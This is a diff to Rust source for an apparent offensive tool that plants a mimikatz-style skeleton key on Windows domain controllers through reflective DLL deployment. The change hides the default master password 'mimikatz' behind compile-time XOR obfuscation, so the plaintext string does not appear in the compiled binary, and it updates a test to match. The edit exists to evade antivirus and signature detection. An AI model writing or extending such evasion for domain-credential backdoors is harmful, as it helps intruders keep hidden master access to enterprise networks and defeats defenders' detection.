@@ -61,7 +61,12 @@ use windows::{
 // ═══════════════════════════════════════════════════════════
 
 /// Default skeleton key password (mimikatz default: "mimikatz")
-pub const DEFAULT_SKELETON_KEY: &str = "mimikatz";
+///
+/// Returns the string via compile-time XOR obfuscation so the plaintext
+/// "mimikatz" does not appear in the binary's `.rdata` section.
+pub fn default_skeleton_key() -> &'static str {
+    crate::xs!("mimikatz")
+}
 
 /// NTLM hash of "mimikatz" (MD4 of UTF-16LE("mimikatz"))
 pub const MIMIKATZ_NTLM_HASH: [u8; 16] = [
@@ -100,7 +105,7 @@ pub struct SkeletonKeyConfig {
 impl Default for SkeletonKeyConfig {
     fn default() -> Self {
         Self {
-            master_password: DEFAULT_SKELETON_KEY.to_string(),
+            master_password: default_skeleton_key().to_string(),
             target_dc: String::new(),
             target_dc_ip: String::new(),
             deployment_method: DeploymentMethod::ReflectiveDll,
@@ -1132,7 +1137,7 @@ mod tests {
     #[test]
     fn test_skeleton_key_config_default() {
         let config = SkeletonKeyConfig::default();
-        assert_eq!(config.master_password, DEFAULT_SKELETON_KEY);
+        assert_eq!(config.master_password, default_skeleton_key());
         assert_eq!(config.deployment_method, DeploymentMethod::ReflectiveDll);
         assert!(config.verify_after_deploy);
         assert!(!config.auto_cleanup);
